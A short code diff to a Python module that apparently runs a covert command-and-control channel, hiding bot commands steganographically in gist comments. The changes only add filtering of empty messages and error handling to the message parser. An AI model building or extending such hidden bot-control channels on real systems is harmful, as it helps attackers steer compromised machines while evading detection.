@@ -42,6 +42,7 @@ def send_message(message):
 def get_fresh_messages(last_seen):
     fresh_comments, last_seen = get_fresh_comments(last_seen)
     messages = [stegano.desteg(comment['body']) for comment in fresh_comments]
+    messages = [msg for msg in messages if msg]  # skip comments without a message
     return messages, last_seen
 
 
@@ -55,12 +56,16 @@ def construct_message(isctrl, bot, cmd, data, respond):
 
 
 def parse_message(comment):
-    isctrl, bot, cmd, d, r = comment.split(DELIM)[1:6]
-    isctrl = bool(int(isctrl))
-    bot = int(bot)
-    cmd = Command[cmd]
-    r = bool(int(r))
-    return isctrl, bot, cmd, d, r
+    try:
+        isctrl, bot, cmd, d, r = comment.split(DELIM)[1:6]
+        isctrl = bool(int(isctrl))
+        bot = int(bot)
+        cmd = Command[cmd]
+        r = bool(int(r))
+        return True, isctrl, bot, cmd, d, r
+    
+    except:
+        return False, None, None, None, None, None
 
 
 def post_gist_comment(msg):
